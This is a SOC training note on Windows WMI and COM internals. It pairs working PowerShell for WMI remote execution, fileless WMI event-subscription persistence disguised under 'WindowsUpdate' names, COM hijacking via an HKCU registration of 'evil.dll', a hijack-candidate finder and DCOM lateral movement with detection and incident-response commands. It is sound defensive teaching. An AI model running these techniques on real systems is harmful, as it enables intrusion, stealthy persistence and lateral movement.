# Windows/11 — WMI & COM Internals

> WMI and COM are two of the most powerful and most abused subsystems on Windows. WMI provides a unified management interface to every aspect of the OS — and a fileless persistence mechanism that survives reboots. COM is the component model underlying nearly every Windows API — and a hijackable execution framework that requires no admin privileges. Understanding both is essential for detecting the techniques that evade signature-based tools.

![MITRE](https://img.shields.io/badge/MITRE-T1047%20|%20T1546.003%20|%20T1546.015-red)
![Platform](https://img.shields.io/badge/Platform-Windows-blue)

---

## WMI Architecture

```
Applications / Scripts
        |
        v
WMI API (wbemdisp.dll, wbemprox.dll)
        |
        v
WMI Service (winmgmt — runs in svchost)
        |
        v
WMI Repository (C:\Windows\System32\wbem\Repository\)
        |   stores: class definitions, instances, subscriptions
        v
WMI Providers (DLLs that map WMI classes to real data)
    Win32_Process -> kernel process structures
    Win32_Service -> SCM service data
    Win32_NetworkAdapter -> network stack
```

WMI uses a namespace hierarchy similar to a filesystem. The most important namespace for security is `root\cimv2`.

---

## WMI Query Language (WQL)

WMI uses SQL-like queries to retrieve management data.

```powershell
# Get all running processes
Get-WmiObject -Query "SELECT * FROM Win32_Process"

# Get specific process
Get-WmiObject -Query "SELECT * FROM Win32_Process WHERE Name = 'lsass.exe'"

# Get process with parent
Get-WmiObject Win32_Process | Select-Object ProcessId, ParentProcessId, Name, CommandLine

# Get services
Get-WmiObject Win32_Service | Where-Object { $_.State -eq 'Running' }

# Get network connections
Get-WmiObject Win32_NetworkConnection

# System info
Get-WmiObject Win32_OperatingSystem
Get-WmiObject Win32_ComputerSystem
```

---

## WMI for Lateral Movement (T1047)

WMI can execute commands on remote systems using DCOM — no additional tools required, uses legitimate Windows infrastructure.

```powershell
# Execute command on remote host via WMI
Invoke-WmiMethod -Class Win32_Process -Name Create `
    -ArgumentList "cmd.exe /c whoami > C:\output.txt" `
    -ComputerName target `
    -Credential (Get-Credential)

# Impacket wmiexec equivalent
# python wmiexec.py domain/user:password@target

# PowerShell remoting via WMI
$wmi = [wmiclass]"\\target\root\cimv2:Win32_Process"
$wmi.Create("powershell.exe -enc JABjAG0AZAA...")
```

**Detection:** Event ID 4648 (explicit credential logon) + network connection to port 135 (DCOM endpoint mapper) + WMI Activity event log entries on target.

---

## WMI Permanent Event Subscriptions (T1546.003)

The most powerful and stealthy Windows persistence mechanism. Three components all stored in the WMI repository — no files created on disk.

### EventFilter

Defines the trigger condition using WQL.

```powershell
# Trigger on system boot (uptime > 200 seconds from start)
$filterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 " +
    "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' " +
    "AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"

# Trigger on specific process creation
$filterQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 5 " +
    "WHERE TargetInstance ISA 'Win32_Process' " +
    "AND TargetInstance.Name = 'notepad.exe'"

# Trigger on user logon (Event ID 4624)
$filterQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 5 " +
    "WHERE TargetInstance ISA 'Win32_NTLogEvent' " +
    "AND TargetInstance.EventCode = 4624"
```

### EventConsumer Types

| Consumer | Action | Notes |
|----------|--------|-------|
| CommandLineEventConsumer | Execute command line | Most common attacker use |
| ActiveScriptEventConsumer | Execute VBScript/JScript | Fileless script execution |
| LogFileEventConsumer | Write to log file | Less common |
| NTEventLogEventConsumer | Write Windows event | Rare |
| SMTPEventConsumer | Send email | Rare |

```powershell
# ActiveScript consumer (VBScript payload — no file)
$consumerArgs = @{
    Name = "PersistenceConsumer"
    ScriptingEngine = "VBScript"
    ScriptText = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -enc JABjAG0AZAA...", 0, False
"@
}
```

### Complete WMI Persistence Setup

```powershell
# Create filter
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "WindowsUpdateFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = $filterQuery
}

# Create consumer
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "WindowsUpdateConsumer"
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -enc JABjAG0AZAA..."
}

# Bind
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

### Detection

```powershell
# Enumerate all WMI subscriptions
Write-Host "=== Event Filters ===" -ForegroundColor Cyan
Get-WMIObject -Namespace root\subscription -Class __EventFilter |
    Select-Object Name, Query | Format-List

Write-Host "=== Event Consumers ===" -ForegroundColor Cyan
Get-WMIObject -Namespace root\subscription -Class __EventConsumer |
    Select-Object Name, CommandLineTemplate, ScriptText | Format-List

Write-Host "=== Filter-Consumer Bindings ===" -ForegroundColor Cyan
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding |
    Format-List

# Sysmon Events 19 (filter), 20 (consumer), 21 (binding)
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-Sysmon/Operational'; Id=@(19,20,21)
} | Select-Object TimeCreated, Id, Message | Format-List

# WMI Activity log
Get-WinEvent -LogName "Microsoft-Windows-WMI-Activity/Operational" |
    Where-Object { $_.Message -match 'subscription|filter|consumer' } |
    Select-Object TimeCreated, Message | Format-List

# Remove malicious subscription
$filter = Get-WMIObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WindowsUpdateFilter'"
$consumer = Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WindowsUpdateConsumer'"
$binding = Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding
$filter.Delete()
$consumer.Delete()
$binding.Delete()
```

---

## COM Architecture

COM (Component Object Model) is Microsoft's binary interface standard for inter-process communication and software reuse. Every COM object has:

- A CLSID (Class ID) — GUID identifying the class
- An IID (Interface ID) — GUID identifying the interface
- A registration in the registry mapping CLSID to implementation

```
Application calls CoCreateInstance({CLSID})
        |
        v
COM runtime reads registry:
    HKCR\CLSID\{CLSID}\InprocServer32 = path\to\implementation.dll
        |
        v
COM loads the DLL and returns interface pointer
        |
        v
Application calls methods via interface
```

---

## COM Hijacking (T1546.015)

HKCU takes precedence over HKLM for COM resolution. A standard user can register a CLSID in HKCU pointing to a malicious DLL — when any application instantiates that COM object, the malicious DLL loads instead.

```powershell
# Find hijackable CLSIDs
# These are CLSIDs registered in HKLM but not in HKCU
# If an application loads one of these, planting in HKCU wins

# Step 1: Find CLSIDs used by auto-elevating processes
# (they run elevated — a COM hijack here = elevated code execution)

# Step 2: Plant malicious registration in HKCU
$clsid = "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" `
    -Name "(default)" -Value "C:\Users\user\AppData\Roaming\evil.dll"
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" `
    -Name "ThreadingModel" -Value "Apartment"
```

### Finding Hijackable COM Objects

```powershell
# CLSIDs in HKLM with no HKCU override — candidates for hijacking
Get-ChildItem "HKLM:\SOFTWARE\Classes\CLSID" | ForEach-Object {
    $clsid = $_.PSChildName
    $hkcu = "HKCU:\Software\Classes\CLSID\$clsid"
    if (-not (Test-Path $hkcu)) {
        $inproc = "$($_.PSPath)\InprocServer32"
        if (Test-Path $inproc) {
            $dll = (Get-ItemProperty $inproc -ErrorAction SilentlyContinue).'(default)'
            if ($dll -and -not (Test-Path $dll)) {
                # DLL doesn't exist — perfect hijack candidate
                [PSCustomObject]@{ CLSID=$clsid; MissingDLL=$dll }
            }
        }
    }
} | Select-Object -First 20
```

### Detection

```powershell
# Monitor HKCU CLSID registrations (Sysmon Event ID 13)
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-Sysmon/Operational'; Id=13
} | Where-Object {
    $_.Message -match 'HKCU.*CLSID.*InprocServer32'
} | Select-Object TimeCreated, Message

# List all user-level COM registrations
Get-ChildItem "HKCU:\Software\Classes\CLSID" -ErrorAction SilentlyContinue |
    ForEach-Object {
        $inproc = Get-ItemProperty "$($_.PSPath)\InprocServer32" -ErrorAction SilentlyContinue
        if ($inproc) {
            [PSCustomObject]@{
                CLSID = $_.PSChildName
                DLL   = $inproc.'(default)'
            }
        }
    }
```

---

## DCOM — Distributed COM

DCOM extends COM to work across network boundaries. Applications can instantiate COM objects on remote machines.

```powershell
# DCOM lateral movement (requires admin on target)
$dcom = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "target"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\out.txt", "7")

# ShellWindows / ShellBrowserWindow DCOM (no admin needed)
$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID([guid]"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}", "target"))
$shell.Item().Document.Application.ShellExecute("cmd.exe", "/c whoami", "C:\Windows\System32", $null, 0)
```

Detection: Network connection to port 135 (DCOM endpoint mapper) + WMI Activity events + process creation on target with unusual parent (DllHost.exe, MsMpEng.exe).

---

## WMI Namespace Exploration

```powershell
# List all WMI namespaces
Get-WmiObject -Namespace root -Class __Namespace | Select-Object Name

# Security-relevant namespaces
root\cimv2           # main namespace — Win32 classes
root\subscription    # WMI subscriptions (persistence)
root\SecurityCenter2 # security products
root\Microsoft\Windows\Defender  # Defender status

# Check for non-standard namespaces (attacker may create)
Get-WmiObject -Namespace root -Class __Namespace |
    Where-Object { $_.Name -notmatch 'cimv2|subscription|SecurityCenter|Microsoft|directory|wmi|DEFAULT|cli' }
```

---

## Investigation Commands

```powershell
# WMI subscription full audit
Write-Host "=== WMI SUBSCRIPTIONS ===" -ForegroundColor Red
"Filters:"; Get-WMIObject -Namespace root\subscription -Class __EventFilter | Format-Table Name, Query
"Consumers:"; Get-WMIObject -Namespace root\subscription -Class __EventConsumer | Format-Table Name, CommandLineTemplate, ScriptText
"Bindings:"; Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding | Format-Table

# HKCU COM registrations
Write-Host "=== USER COM REGISTRATIONS ===" -ForegroundColor Yellow
Get-ChildItem "HKCU:\Software\Classes\CLSID" -ErrorAction SilentlyContinue |
    ForEach-Object {
        $inproc = (Get-ItemProperty "$($_.PSPath)\InprocServer32" -ErrorAction SilentlyContinue).'(default)'
        if ($inproc) { "$($_.PSChildName) -> $inproc" }
    }

# WMI-spawned processes (C2 via WMI)
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-WMI-Activity/Operational'
} -MaxEvents 50 | Select-Object TimeCreated, Message | Format-List

# DCOM connections
Get-NetTCPConnection -RemotePort 135 -State Established |
    ForEach-Object {
        $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
        "$($proc.Name) -> $($_.RemoteAddress):135"
    }
```

---

## MITRE ATT&CK Mapping

| Technique | ID |
|-----------|-----|
| Windows Management Instrumentation | T1047 |
| Event Triggered Execution: WMI Event Subscription | T1546.003 |
| Hijack Execution Flow: COM Hijacking | T1546.015 |
| Lateral Tool Transfer via DCOM | T1021.003 |

---

## Practitioner Notes

**On WMI repository forensics:** The WMI repository files (`OBJECTS.DATA`, `INDEX.BTR`, `MAPPING*.MAP`) are binary and cannot be read with standard tools. The python-cim library and Mandiant's WMI forensics tools parse these files directly — enabling offline analysis of WMI subscriptions even when the system is not running. During IR, acquiring the repository directory is as important as acquiring the registry hives.

**On COM hijacking privilege level:** A COM hijack in HKCU executes at the privilege level of the process that instantiates the COM object. If a standard user COM hijack is loaded by an auto-elevating process, the malicious DLL runs elevated without a UAC prompt. Finding auto-elevating processes that load hijackable CLSIDs requires Process Monitor or similar tooling to trace COM loads.

**On WmiPrvSE.exe as parent:** Processes spawned by WMI subscriptions have WmiPrvSE.exe as parent. Detecting unusual children of WmiPrvSE.exe (cmd.exe, powershell.exe, or any non-system binary) is a reliable WMI subscription execution indicator. Sysmon Event ID 1 captures parent-child relationships.

---

## Knowledge Validation

**Why is WMI subscription persistence harder to detect than registry run key persistence?**
Registry run keys create values in well-known, heavily monitored registry paths. File monitoring and registry auditing catch them immediately. WMI subscriptions are stored in the WMI repository binary files — not as registry keys, not as files on disk in any accessible location. Standard file monitoring, registry monitoring, and most registry-based persistence scanners do not detect them. Detection requires querying the WMI subscription namespace directly or Sysmon Events 19-21 captured at creation time.

**How does COM hijacking achieve code execution without admin privileges?**
COM resolution checks HKCU before HKLM. Any standard user can write to HKCU. By creating a CLSID registration in HKCU pointing to a malicious DLL, the attacker intercepts COM instantiation for that CLSID in any process running as that user. When a legitimate application instantiates the COM object, the COM runtime loads the malicious DLL from HKCU instead of the legitimate one from HKLM. No UAC prompt, no admin requirement, no file writes to protected directories.

**During IR you find WmiPrvSE.exe spawning powershell.exe with an encoded command. What does this indicate and what are your next steps?**
WmiPrvSE.exe is the WMI provider host — it spawns processes on behalf of WMI subscriptions. A PowerShell child of WmiPrvSE.exe indicates active WMI subscription execution. Steps: (1) immediately enumerate WMI subscriptions — `Get-WMIObject -Namespace root\subscription -Class __EventFilter/Consumer/Binding`; (2) decode the PowerShell command; (3) check WMI Activity event log for subscription execution history; (4) acquire the WMI repository from `C:\Windows\System32\wbem\Repository\` for offline analysis; (5) remove the subscription components; (6) investigate what the payload did during execution — check for child processes, network connections, and file writes from the WmiPrvSE.exe process tree.

---

*Windows/11-WMI-COM-Internals | OS-Internals-for-SOC | Solomon James (@Jaysolex)*
